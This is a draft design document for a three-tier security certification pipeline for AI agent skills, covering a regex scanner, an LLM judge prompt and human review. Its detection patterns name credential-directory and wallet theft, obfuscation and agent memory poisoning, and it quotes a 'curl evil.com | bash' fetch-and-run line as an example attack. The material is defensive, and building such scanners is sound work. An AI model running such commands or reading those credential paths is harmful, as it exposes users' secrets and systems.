# Three-Tier Certification System Design

**Status**: DRAFT
**Author**: anton.abyzov@gmail.com
**Date**: 2026-02-15
**Satisfies**: AC-US4-02 (T-008)
**Downstream Dependencies**: T-009, T-013, T-015, T-015b, T-015c, T-024, T-025, T-029, T-030, T-034, T-036, T-041

---

## 1. Overview

The three-tier certification system provides graduated trust for AI agent skills. Each tier increases in cost, latency, and confidence. Skills enter at Tier 1 and can escalate upward through automated or manual processes.

```mermaid
flowchart TD
    SUBMIT[Skill Submitted] --> T1{Tier 1: SCANNED}
    T1 -->|PASS| T2{Tier 2: VERIFIED}
    T1 -->|FAIL| REJECT[Rejected]
    T2 -->|PASS score>=80| APPROVED[Auto-Approved]
    T2 -->|CONCERNS 60-79| REVIEW[Needs Review]
    T2 -->|FAIL <60| REJECT
    REVIEW --> T3{Tier 3: CERTIFIED}
    T3 -->|Approved| CERTIFIED[Certified]
    T3 -->|Rejected| REJECT
    APPROVED -->|Author requests| T3

    VENDOR[Vendor Org Detected] -->|Auto-verify| APPROVED
```

---

## 2. Tier 1: SCANNED (Automated, Deterministic)

### 2.1 Purpose

Fast, free, deterministic scanning that catches obvious threats. Every submitted skill passes through Tier 1 regardless of source.

### 2.2 Scanner Engine

Built on SpecWeave's existing `security-scanner.ts` with extensions from the Secure Skill Factory Standard (T-007).

#### 2.2.1 Pattern Categories (37 total, extended from 26)

| Category | Count | Severity | Source |
|----------|-------|----------|--------|
| Destructive Command | 7 | Critical | Existing security-scanner.ts |
| Remote Code Execution | 6 + 5 new = 11 | Critical | Existing + Snyk patterns |
| Credential Access | 6 + 3 new = 9 | High/Critical | Existing + wallet/SSH patterns |
| Dangerous Permissions | 1 | High | Existing |
| Prompt Injection | 4 | High | Existing |
| Network Access | 4 | Info | Existing |
| Frontmatter Issue | 1 | Medium | Existing |
| Obfuscation | 2 new | Critical | Snyk ToxicSkills patterns |
| Data Exfiltration | 2 new | High/Medium | New category |
| Memory Poisoning | 1 new | Critical | Snyk attack pattern |

#### 2.2.2 New Patterns (11 additions)

```typescript
// Obfuscation
{ pattern: /\$\{[a-z]\}/, severity: 'critical', category: 'obfuscation',
  message: 'Bash parameter expansion obfuscation detected' },
{ pattern: /\\x[0-9a-fA-F]{2}/, severity: 'critical', category: 'obfuscation',
  message: 'Hex-encoded content detected' },

// Extended RCE
{ pattern: /python3?\s+-c\s+"/, severity: 'critical', category: 'remote-code-execution',
  message: 'Inline Python execution detected' },
{ pattern: /subprocess\.run|os\.system|os\.popen/, severity: 'critical', category: 'remote-code-execution',
  message: 'Python subprocess execution detected' },
{ pattern: /Runtime\.getRuntime\(\)\.exec/, severity: 'critical', category: 'remote-code-execution',
  message: 'Java Runtime exec detected' },
{ pattern: /unzip\s+-P|7z\s+x\s+-p/, severity: 'critical', category: 'remote-code-execution',
  message: 'Password-protected archive extraction (malware distribution pattern)' },
{ pattern: /atob\s*\(|btoa\s*\(|base64\s+-d/, severity: 'critical', category: 'obfuscation',
  message: 'Base64 encoding/decoding detected (potential payload hiding)' },

// Extended Credential Access
{ pattern: /~\/\.ssh\/|~\/\.aws\/|~\/\.gnupg\//, severity: 'critical', category: 'credential-access',
  message: 'SSH/AWS/GPG key directory access detected' },
{ pattern: /~\/\.clawdbot\/|~\/\.openclaw\/|~\/\.moltbot\//, severity: 'critical', category: 'credential-access',
  message: 'OpenClaw credential directory access detected' },
{ pattern: /MetaMask|Exodus|Coinbase.*wallet/i, severity: 'critical', category: 'credential-access',
  message: 'Cryptocurrency wallet path access detected' },

// Memory Poisoning
{ pattern: /SOUL\.md|MEMORY\.md.*(?:write|modify|edit|append|overwrite)/i, severity: 'critical', category: 'memory-poisoning',
  message: 'Agent memory file modification instruction detected' },
```

#### 2.2.3 Structural Validation

In addition to pattern scanning, Tier 1 performs structural checks:

| Check | Required | On Failure |
|-------|----------|------------|
| Valid YAML frontmatter | Yes | Reject |
| `description` field present (10-1024 chars) | Yes | Reject |
| No executable files in root | Yes | Warning (flag) |
| Total skill size < 500KB | Yes | Reject |
| No symlinks in skill directory | Yes | Reject |
| No binary files | Yes | Reject |
| File extensions whitelist (`.md`, `.ts`, `.js`, `.json`, `.yaml`, `.yml`, `.png`, `.svg`) | Yes | Warning |

#### 2.2.4 Full Repository Scanning Scope

Tier 1 scanning applies to ALL files in the skill repository, not just SKILL.md:

| File Type | Scanned? | Patterns Applied |
|-----------|----------|-----------------|
| `SKILL.md` | Yes (primary) | All 37 patterns + structural checks |
| `scripts/*.sh` | Yes | All 37 patterns (shell-focused) |
| `scripts/*.py` | Yes | Python RCE patterns (subprocess, os.system) |
| `scripts/*.ts`, `scripts/*.js` | Yes | All 37 patterns |
| `hooks/` directory files | Yes | All 37 patterns |
| `.json`, `.yaml`, `.yml` configs | Yes | Credential patterns only |
| Binary files | No (rejected) | Structural check: no binary files |
| Files > 100KB | No (flagged) | Warning: oversized file |

**Scanning method**: Shallow clone (depth=1) of the submitted repository. All non-binary files co-located with or referenced by SKILL.md are included.

**Limits**: Individual file max 100KB, total scan payload max 1MB per skill repository.

**Rationale**: Snyk documented that `curl evil.com | bash` in `scripts/setup.sh` would pass a SKILL.md-only scanner. A skill with `scripts/` directory must have its scripts scanned at Tier 1, not just escalated to Tier 3.

### 2.3 Pass/Fail Criteria

```
PASS: Zero critical/high findings AND all structural checks pass
FAIL: Any critical/high finding OR any required structural check fails
```

**Output**:
```typescript
interface Tier1Result {
  verdict: 'PASS' | 'FAIL';
  findings: FabricSecurityFinding[];
  structuralChecks: StructuralCheck[];
  patternsScanned: number;    // 37
  scanDuration_ms: number;
  scannerVersion: string;
}
```

### 2.4 Performance Target

- **Latency**: < 500ms per skill (pattern matching + structural checks)
- **Cost**: Zero (deterministic, no external API calls)
- **Throughput**: 1000+ skills/minute on single core

---

## 3. Tier 2: VERIFIED (Scanner + LLM Judge)

### 3.1 Purpose

Deep semantic analysis that catches obfuscation, behavioral mismatches, and sophisticated threats that regex cannot detect. Addresses Snyk's critique that "denylist approaches are a losing battle against the infinite corpus of natural language."

### 3.2 Prerequisites

- Tier 1 must PASS before Tier 2 runs
- Requires Cloudflare Workers AI access (`@cf/meta/llama-3.1-70b-instruct` via `env.AI` binding)

### 3.3 LLM Judge Analysis

Extends the existing `SkillJudge` class (`src/core/skills/skill-judge.ts`) with a security-focused evaluation domain.

#### 3.3.1 Security Domain Criteria

```typescript
const SECURITY_DOMAIN_CRITERIA: DomainCriteria = {
  domain: 'skill-security',
  criteria: [
    'Skill description accurately represents its actual instructions',
    'Declared scope matches the operations the skill instructs the agent to perform',
    'Permissions are minimal — no over-privileged access requests',
    'Security notes are honest and complete — no hidden behavior',
    'No obfuscated instructions that bypass pattern scanning',
    'No behavioral mismatch between stated purpose and actual instructions',
    'No social engineering patterns (urgency, authority impersonation)',
    'No instruction chains that build toward a dangerous outcome incrementally',
    'Compatible with the Security Prompt Template constraints',
    'Instructions do not modify agent configuration or memory files',
  ],
  weight: 10,
};
```

#### 3.3.2 Evaluation Prompt Template

```
You are a SECURITY JUDGE for AI agent skills (SKILL.md files).

## Your Task
Analyze this skill for security risks that PATTERN-BASED scanners miss.

## Context
This skill has PASSED Tier 1 automated scanning (37 regex patterns).
Your job is to catch what regex missed:
- Obfuscated malicious intent
- Social engineering in natural language
- Behavioral mismatches (what it says vs what it does)
- Incremental instruction chains that are individually harmless but collectively dangerous
- Scope creep (requests more access than justified)

## The Skill Content
[SKILL.MD CONTENT]

## Tier 1 Scan Results
[FINDINGS SUMMARY]

## Evaluate On These Criteria
[SECURITY_DOMAIN_CRITERIA]

## Response Format
{
  "verdict": "PASS" | "CONCERNS" | "FAIL",
  "score": 0-100,
  "summary": "one-line assessment",
  "intentAnalysis": "What does this skill actually instruct the agent to do?",
  "scopeAlignment": "Does the scope declaration match the actual instructions?",
  "capabilityAssessment": "What capabilities does this skill need and are they justified?",
  "obfuscationCheck": "Any hidden or obfuscated behavior?",
  "socialEngineering": "Any social engineering patterns?",
  "strengths": ["..."],
  "concerns": ["..."],
  "recommendations": ["..."],
  "domainChecks": [{"criterion": "...", "passed": true/false, "notes": "..."}]
}
```

### 3.4 Pass/Fail Criteria

```
PASS:      Score >= 80, verdict = "PASS"      → Auto-approved (Tier 2 badge)
CONCERNS:  Score 60-79, verdict = "CONCERNS"  → Flagged for review (may escalate to Tier 3)
FAIL:      Score < 60, verdict = "FAIL"       → Rejected
```

**Scoring Breakdown**:

| Criterion | Weight | Max Points |
|-----------|--------|------------|
| Intent-scope alignment | 20% | 20 |
| Permission minimality | 15% | 15 |
| Obfuscation absence | 15% | 15 |
| Social engineering absence | 10% | 10 |
| Security notes completeness | 10% | 10 |
| Template compliance | 10% | 10 |
| Behavioral consistency | 10% | 10 |
| Capability justification | 10% | 10 |
| **Total** | **100%** | **100** |

**Output**:
```typescript
interface Tier2Result {
  verdict: 'PASS' | 'CONCERNS' | 'FAIL';
  score: number;           // 0-100
  summary: string;
  intentAnalysis: string;
  scopeAlignment: string;
  capabilityAssessment: string;
  obfuscationCheck: string;
  socialEngineering: string;
  strengths: string[];
  concerns: string[];
  recommendations: string[];
  domainChecks: DomainCheck[];
  model: string;           // e.g., '@cf/meta/llama-3.1-70b-instruct'
  scanDuration_ms: number;
  tier1Result: Tier1Result; // Reference to upstream result
}
```

### 3.5 Performance Target

- **Latency**: 5-15 seconds per skill (Workers AI inference)
- **Cost**: ~$0.003 per skill (Llama 3.1 70B, ~2K input + 1K output tokens at $0.293/M input, $2.253/M output)
- **Throughput**: ~300 req/min (Workers AI rate limit for text generation)
- **Model**: `@cf/meta/llama-3.1-70b-instruct` on Cloudflare Workers AI (serverless, no GPU management)
- **Free tier**: ~10,000 neurons/day (sufficient for <~100 scans/day)
- **At scale (500/day)**: ~$1.50/day = ~$45/month

---

## 4. Tier 3: CERTIFIED (Manual Review + Sandbox Testing)

### 4.1 Purpose

Human expert review for skills that request high-privilege access, have borderline Tier 2 scores, or are submitted for the highest trust level. This is the only tier that provides signed attestation.

### 4.2 Prerequisites

- Tier 2 must complete (PASS or CONCERNS)
- Skills auto-escalate to Tier 3 when:
  - Tier 2 score is 60-79 (CONCERNS)
  - Skill requests `Bash(*)` (unrestricted shell access)
  - Skill includes `scripts/` directory with executable content
  - Author requests Tier 3 certification

### 4.3 Review Process

```mermaid
flowchart TD
    ASSIGN[Assign Reviewer] --> READ[Read Skill Content]
    READ --> CHECK[Verify Tier 1+2 Results]
    CHECK --> SANDBOX[Sandbox Test]
    SANDBOX --> REVIEW[Code Review]
    REVIEW --> DECIDE{Decision}
    DECIDE -->|Approve| SIGN[Sign Attestation]
    DECIDE -->|Request Changes| FEEDBACK[Send Feedback]
    DECIDE -->|Reject| REJECT[Reject with Reason]
    SIGN --> PUBLISH[Publish as Certified]
    FEEDBACK --> RESUBMIT[Author Resubmits]
    RESUBMIT --> READ
```

#### 4.3.1 Sandbox Testing

The reviewer activates the skill in an isolated environment:

1. **Container isolation**: Skill loaded into a Docker container with network disabled
2. **Agent simulation**: Simulated agent context with test prompts
3. **Behavior monitoring**: Log all file operations, network attempts, process spawns
4. **Comparison**: Compare actual behavior against declared scope and permissions
5. **Duration**: 15-30 minutes per skill

#### 4.3.2 Code Review Checklist

| Category | Check | Required |
|----------|-------|----------|
| **Intent** | Does the skill do what it claims? | Yes |
| **Scope** | Are operations limited to declared scope? | Yes |
| **Permissions** | Are requested permissions minimal and justified? | Yes |
| **Security Notes** | Are all security-relevant behaviors disclosed? | Yes |
| **Scripts** | Are scripts in `scripts/` directory safe and documented? | Yes |
| **Dependencies** | Are external references (URLs, packages) trustworthy? | Yes |
| **Edge Cases** | Are error paths handled safely? | Yes |
| **Compatibility** | Does the skill work on declared agents? | Recommended |

#### 4.3.3 Signed Attestation

```typescript
interface CertificationAttestation {
  skillName: string;
  version: string;
  contentHash: string;        // SHA-256 of SKILL.md at review time
  certifiedBy: string;        // Reviewer ID
  certifiedAt: string;        // ISO timestamp
  validUntil: string;         // Certification expiry (6 months)
  scope: string;              // Summary of reviewed scope
  restrictions: string[];     // Any conditions on the certification
  signature: string;          // HMAC-SHA256 or GPG signature
}
```

### 4.4 Pass/Fail Criteria

```
CERTIFIED: Reviewer approves + attestation signed → Tier 3 badge
REJECTED:  Reviewer rejects with documented reason → Rejected
CHANGES:   Reviewer requests modifications → Author resubmits (re-enters at Tier 1)
```

### 4.5 Performance Target

- **Latency**: 1-5 business days per skill
- **Cost**: Free (community volunteer reviewers)
- **Throughput**: 5-20 skills/week per reviewer
- **Validity**: 6 months (re-certification required on expiry or major version bump)

---

## 5. Vendor Auto-Verification

### 5.1 Trusted Organizations

Skills from the following GitHub organizations automatically receive `verified` status (Tier 2 equivalent) without scanning:

| Organization | Display Name | Rationale |
|-------------|-------------|-----------|
| `anthropics/` | Anthropic | Agent Skills standard creator, MCP author |
| `openai/` | OpenAI | Codex CLI / ChatGPT skill publisher |
| `google/` or `google-gemini/` | Google | Gemini CLI skill publisher |
| `vercel-labs/` | Vercel | Skills.sh creator, infrastructure provider |
| `supabase/` | Supabase | Database platform, trusted partner |
| `microsoft/` | Microsoft | Copilot skill publisher (131 skills) |

### 5.2 Auto-Verification Rules

```typescript
const TRUSTED_ORGS = [
  'anthropics', 'openai', 'google', 'google-gemini',
  'vercel-labs', 'supabase', 'microsoft'
];

function isVendorAutoVerified(repoOwner: string): boolean {
  return TRUSTED_ORGS.includes(repoOwner.toLowerCase());
}
```

**Process**:
1. Submission received with GitHub repo URL
2. Extract `owner` from `github.com/{owner}/{repo}`
3. If `owner` matches `TRUSTED_ORGS` → skip Tier 1 and Tier 2 → auto-approve as `verified`
4. Lock file records: `tier: 'verified'`, `verificationMethod: 'vendor-auto'`
5. Vendor skills CAN request Tier 3 (certified) by explicit request

### 5.3 Custom Whitelist

Deployments can configure additional trusted orgs:

```json
// .specweave/config.json or vskill.config.json
{
  "verification": {
    "trustedOrgs": ["my-company", "partner-org"],
    "trustedOrgsTier": "verified"
  }
}
```

### 5.4 Vendor Monitoring

Even auto-verified vendor skills are subject to:
- **Continuous monitoring**: Re-crawl for content changes on schedule
- **Badge downgrade**: If a vendor skill is found to contain security issues, it loses auto-verification for that specific skill (not the entire org)
- **Incident response**: Security team can revoke vendor auto-verification in emergencies

---

## 6. Escalation Rules

### 6.1 Automatic Escalation (Tier 1 → Tier 2)

All skills that pass Tier 1 automatically proceed to Tier 2 if:
- The submission pipeline is configured for full verification (default for verified-skill.com)
- Or the skill author explicitly requests Tier 2

### 6.2 Automatic Escalation (Tier 2 → Tier 3)

| Condition | Trigger | Action |
|-----------|---------|--------|
| Score 60-79 | Tier 2 CONCERNS verdict | Auto-escalate to Tier 3 review queue |
| High-privilege skill | Skill requests `Bash(*)` or `Write` to system dirs | Auto-escalate |
| Scripts directory | Skill includes `scripts/` with executable files | Scan all scripts at Tier 1 + auto-escalate to Tier 3 |
| Network-accessing skill | Skill declares network access in permissions | Auto-escalate |
| Author request | Author explicitly submits for Tier 3 | Escalate |

### 6.3 Downgrade Rules

| Condition | From | To | Trigger |
|-----------|------|----|---------|
| Suspicious update detected | Verified/Certified | Scanned | Continuous monitoring re-scan |
| Certification expired | Certified | Verified | 6-month expiry |
| Org trust revoked | Verified (vendor) | Scanned | Security incident |
| Content hash mismatch | Any tier | Scanned | Tamper detection |
| Author account suspended | Any tier | Rejected | Platform action |

---

## 7. Version-Pinned Verification

### 7.1 Core Principle

**Verification is per-version, not per-skill.** A badge reads "verified at v1.3.0" — not just "verified."

### 7.2 Version Tracking

```typescript
interface VersionVerification {
  version: string;          // Semantic version
  contentHash: string;      // SHA-256 of full skill directory
  gitSha: string;           // Git commit SHA at verification time
  tier: CertificationLevel; // The tier this version achieved
  verifiedAt: string;       // ISO timestamp
  findings: number;         // Number of non-critical findings
  scannerVersion: string;   // Scanner version used
}
```

### 7.3 Update Verification

When a previously verified skill is updated:

1. **Diff scan**: Compare new content against last verified version
2. **Highlight new patterns**: "v1.3.1 adds: `fetch()`, `process.env` — REVIEW REQUIRED"
3. **Re-run full pipeline**: New version enters at Tier 1 regardless of previous tier
4. **Version bump classification**:
   - **MAJOR**: New permissions, scope expansion, new destructive capabilities → full re-verification
   - **MINOR**: New instructions/sections adding capabilities → Tier 1 + Tier 2
   - **PATCH**: Typos, formatting, documentation only → Tier 1 only (fast-path)
5. **Badge update**: New version gets its own badge; old version badge preserved in history

---

## 8. Data Model

### 8.1 CertificationLevel Enum

```typescript
type CertificationLevel = 'scanned' | 'verified' | 'certified' | 'rejected' | 'none';
```

### 8.2 Certification Record

```typescript
interface CertificationRecord {
  /** Current certification level */
  level: CertificationLevel;

  /** How was this level achieved */
  method: 'automated-scan' | 'llm-judge' | 'manual-review' | 'vendor-auto';

  /** Version this certification applies to */
  version: string;

  /** Content hash at certification time */
  contentHash: string;

  /** When certification was granted */
  certifiedAt: string;

  /** When certification expires (Tier 3 only) */
  expiresAt?: string;

  /** Tier 1 result */
  tier1?: Tier1Result;

  /** Tier 2 result (if applicable) */
  tier2?: Tier2Result;

  /** Tier 3 attestation (if applicable) */
  attestation?: CertificationAttestation;

  /** Certification history (previous versions) */
  history?: VersionVerification[];
}
```

---

## 9. Cost-Benefit Analysis

| Tier | Cost per Skill | Latency | False Negative Rate | False Positive Rate | Catches |
|------|---------------|---------|--------------------|--------------------|---------|
| **Tier 1** | $0 | <500ms | ~40% (Snyk estimate) | ~5% (safe context handling) | Obvious patterns, structural issues |
| **Tier 2** | ~$0.003 | 5-15s | ~10-20% | ~3% (LLM context understanding) | Obfuscation, behavioral mismatch, social engineering |
| **Tier 3** | Free (volunteer) | 1-5 days | ~1-5% | ~1% (human judgment) | Sophisticated targeted attacks, subtle logic bombs |

**Combined three-tier false negative rate**: ~1-5% (multiplicative reduction across tiers)

---

## 10. Implementation Priority

| Priority | Component | Effort | Dependencies |
|----------|-----------|--------|-------------|
| P0 | Extend security-scanner.ts with 11 new patterns | 2-4 hours | None |
| P0 | `Tier1Result` and `CertificationLevel` types | 1 hour | None |
| P1 | Security domain criteria for SkillJudge | 2-3 hours | skill-judge.ts |
| P1 | Tier2 evaluation prompt and result types | 2-3 hours | skill-judge.ts |
| P2 | Vendor auto-verification logic | 1-2 hours | Trusted org list |
| P2 | Version-pinned verification types | 1-2 hours | None |
| P3 | Tier 3 review process and attestation | Design only | Admin dashboard |
| P3 | Continuous monitoring pipeline | Design only | Crawler infrastructure |

---

## 11. References

- [SpecWeave security-scanner.ts](/src/core/fabric/security-scanner.ts) — Existing 26-pattern scanner (312 lines)
- [SpecWeave skill-judge.ts](/src/core/skills/skill-judge.ts) — Existing LLM judge (613 lines)
- [SpecWeave registry-schema.ts](/src/core/fabric/registry-schema.ts) — Existing schema (86 lines)
- [Snyk: Why Your Skill Scanner Is Just False Security](https://snyk.io/blog/skill-scanner-false-security/) — Scanner limitations
- [Snyk ToxicSkills Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) — Ecosystem analysis
- [Cisco Skill Scanner](https://github.com/cisco-ai-defense/skill-scanner) — Multi-layer approach reference
- [SkillsDirectory.com](https://www.skillsdirectory.com/) — Competitive 50-rule scanner
- [NCSC UK: Prompt Injection](https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection) — Risk management approach
